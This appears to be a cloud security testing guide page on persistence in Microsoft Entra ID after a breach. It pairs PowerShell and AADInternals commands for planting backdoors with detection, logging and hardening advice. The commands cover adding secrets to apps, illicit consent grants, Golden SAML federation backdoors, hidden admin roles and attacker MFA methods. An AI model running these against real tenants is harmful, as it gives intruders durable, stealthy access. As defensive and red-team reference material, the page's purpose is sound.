---
cstg_id: CSTG-AZURE-ENTRA-ID-PERSIST
title: "AZURE Entra Id - Persistence"
provider: azure
service: entra-id
phase: persistence
required_access: assumed-breach
required_permissions:
  - "Elevated directory access (Global Administrator, Privileged Role Administrator, Application Administrator, or a service principal with Application.ReadWrite.All / RoleManagement.ReadWrite.Directory / Policy.ReadWrite.* ) obtained from prior phases"
tools: [Microsoft Graph PowerShell SDK, az cli, AADInternals, ROADtools (roadtx), MicroBurst]
references:
  - "https://learn.microsoft.com/en-us/entra/identity-platform/application-rollup"
  - "https://learn.microsoft.com/en-us/graph/api/application-addpassword"
  - "https://learn.microsoft.com/en-us/entra/identity/authentication/concept-authentication-methods"
  - "https://learn.microsoft.com/en-us/entra/external-id/cross-tenant-access-overview"
  - "https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed"
  - "https://aadinternals.com/post/aadbackdoor/"
  - "https://o365blog.com/post/adfs/"
  - "https://github.com/dirkjanm/ROADtools"
license: CC BY-SA 4.0
---

## Summary

Persistence in Entra ID is the establishment of durable, stealthy access that survives password resets, MFA enrolment changes, session revocation, and even partial remediation. Because Entra ID authenticates not only users but applications, service principals, federated trusts, and devices, an attacker with elevated access has many independent footholds to plant — and several of them are difficult to spot because they masquerade as legitimate identity infrastructure (extra app credentials, an alternate authentication method, a federated domain, a hidden admin).

The attacker objective is to retain tenant access after the initial credential or path is closed. This page enumerates the durable backdoors available once directory-admin or equivalent application/credential-management rights are held. Detection of these artefacts is exactly what defenders should hunt for during incident response. Obtaining the elevated access that enables these techniques is covered in [privilege escalation](../03-privilege-escalation/azure-entra-id-privesc.md).

## Prerequisites

- Elevated directory access from prior phases: Global Administrator / Privileged Role Administrator, Application Administrator, or a service principal with `Application.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`, or policy-write Graph permissions.
- For federation persistence: Global Administrator or Hybrid Identity Administrator and access to manage federated domains.
- A Microsoft Graph token with the relevant write scopes.

## Enumeration

```powershell
# Baseline the legitimate state so backdoor artefacts are distinguishable
Get-MgApplication -All -Property AppId,DisplayName,PasswordCredentials,KeyCredentials
Get-MgServicePrincipal -All -Property AppId,DisplayName,KeyCredentials,PasswordCredentials
Get-MgDomain -All | Select-Object Id,AuthenticationType,IsVerified   # federated vs managed
Get-MgRoleManagementDirectoryRoleEligibilitySchedule -All            # standing PIM eligibility
```

## Misconfigurations & Findings

- **Extra credentials on applications/service principals** — additional client secrets or certificates that provide independent, long-lived app-only access.
- **Federated/backdoor domains** — a malicious federated domain or token-signing certificate allowing forged SAML tokens (Golden SAML) for any user.
- **Hidden privileged principals** — newly created users/SPs added to admin roles or role-assignable groups, or PIM eligibility quietly granted.
- **Alternate authentication methods** — attacker-controlled MFA methods (authenticator app, phone, FIDO key) registered on a victim or break-glass account.
- **Excessive consented OAuth applications** — a multi-tenant or single-tenant app with broad Graph permissions consented for persistent programmatic access (illicit consent grant).
- **Cross-tenant access trust** — inbound trust configured to a tenant the attacker controls.
- **Tenant-wide app role grants** that re-establish escalation even after the original path is removed.

## Exploitation

### Service principal / application credential backdoor

Add a fresh secret or certificate to an existing, trusted application or service principal. The attacker can then authenticate app-only at any time; the credential persists through user password resets.

```powershell
# Add a long-lived secret to a legitimate, privileged app
$pw = Add-MgApplicationPassword -ApplicationId <app-objectId> `
  -PasswordCredential @{ displayName = "monitoring"; endDateTime = (Get-Date).AddYears(2) }
# Or a certificate (stealthier; blends with normal cert-based auth)
Add-MgApplicationKey -ApplicationId <app-objectId> -KeyCredential @{ type="AsymmetricX509Cert"; usage="Verify"; key=<cert-bytes> } -Proof <proof>
```

### Illicit consent grant (OAuth application backdoor)

Register or reuse an application, grant it broad Graph application permissions, and admin-consent it. The app's service principal then holds standing access independent of any user.

```powershell
# Grant Mail.Read + Directory.Read.All (app roles) to a controlled SP and consent
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId <controlled-sp> `
  -PrincipalId <controlled-sp> -ResourceId <graph-sp-id> -AppRoleId <Directory.Read.All-appRoleId>
```

### Federated domain / Golden SAML

With domain-management rights, convert a domain to federated (or alter the token-signing certificate) so the attacker can mint SAML tokens for arbitrary users without their credentials — a powerful, hard-to-detect backdoor.

```powershell
# AADInternals-style: register a backdoor federated domain / token-signing cert
ConvertTo-AADIntBackdoor -DomainName "contoso.com"     # establishes attacker-controlled federation
# Forge a token for any user thereafter
Open-AADIntOffice365Portal -ImmutableID <user-immutableId> -Issuer <issuer> -UseBuiltInCertificate
```

### Hidden admin / role-assignable group membership

Create or co-opt a low-profile user or service principal and assign a directory role, or add it to a role-assignable group, optionally via **PIM eligibility** so it appears only as "eligible".

```powershell
New-MgRoleManagementDirectoryRoleAssignment -RoleDefinitionId <PrivilegedRoleAdmin-template> -PrincipalId <hidden-principal> -DirectoryScopeId "/"
```

### Alternate authentication method on a break-glass / admin account

Register an attacker-controlled MFA method so the account can be re-accessed even after password reset.

```powershell
# Add a phone / authenticator method to a target account (with auth-method write rights)
New-MgUserAuthenticationPhoneMethod -UserId <target> -PhoneType mobile -PhoneNumber "+1 5550000000"
```

### Cross-tenant trust backdoor

Configure inbound cross-tenant access settings to trust a tenant the attacker controls, enabling re-entry via B2B even after local accounts are cleaned.

## Detection & Logging

- **Entra ID audit logs** explicitly record the persistence artefacts: `Add service principal credentials` / `Update application – Certificates and secrets management` (credential backdoors), `Add app role assignment to service principal` and `Consent to application` (illicit consent), `Set domain authentication` / `Set federation settings on domain` (federation backdoor — extremely high severity), `Add member to role` / `Add eligible member to role` (hidden admin), `User registered security info` / `Admin registered security info` (auth-method changes), and cross-tenant access policy updates.
- **Service principal sign-in logs** reveal app-only authentications using the backdoor credential, often from new IPs/ASNs.
- Federation backdoors produce **sign-ins with no corresponding interactive authentication** and unusual `issuer`/token claims; monitor for changes to domain `authenticationType` and token-signing certificates.
- **Microsoft Defender for Cloud Apps** and **Entra ID Protection** flag "suspicious addition of credentials to an OAuth app", anomalous consent, and risky admin sign-ins.
- **Azure Activity Logs** capture downstream resource persistence (e.g., new role assignments, Automation runbooks) if the attacker also persists on the resource plane.

## Remediation & Hardening

- Alert on and review **all credential additions** to applications/service principals; enforce certificate-based, short-lived credentials and a credential inventory.
- Restrict **user consent** to verified publishers and low-risk delegated permissions; require **admin consent workflow**; periodically review consented apps and OAuth grants.
- Treat **domain federation settings and token-signing certificates** as Tier-0; alert immediately on `Set domain authentication`/federation changes; prefer managed authentication and remove unused federated domains.
- Protect **break-glass accounts** with monitored, phishing-resistant methods and alert on any auth-method change to admin accounts.
- Use **PIM** for all privileged roles, review **eligible** assignments (not just active ones), and run regular access reviews to catch hidden admins.
- Lock down **cross-tenant access settings**; default-deny inbound trust and review configured partner tenants.
- Forward Entra audit/sign-in logs and the Unified Audit Log to a SIEM with detections for the audit events listed above; ensure adequate retention.
- During incident response after a confirmed Global-Admin compromise, **rotate token-signing certificates, all app/SP credentials, and break-glass credentials**, and review every privileged assignment and federated domain.

## Tools

- **Microsoft Graph PowerShell SDK** — credential, role, consent, and auth-method management.
- **az cli** — service-principal credential and resource-plane persistence.
- **AADInternals** — federation/Golden SAML backdoors, credential and auth-method primitives.
- **ROADtools (roadtx)** — token and app-only authentication for backdoor credentials.
- **MicroBurst** — Azure/Entra persistence and backdoor scripts.

## References

- Microsoft Learn — applications and service principals overview
- Microsoft Graph `application: addPassword` API
- Microsoft Learn — authentication methods concept
- Microsoft Learn — cross-tenant access overview
- Microsoft Learn — Entra federation (what is federation)
- AADInternals — Entra ID backdoor and ADFS / Golden SAML research
- ROADtools project documentation
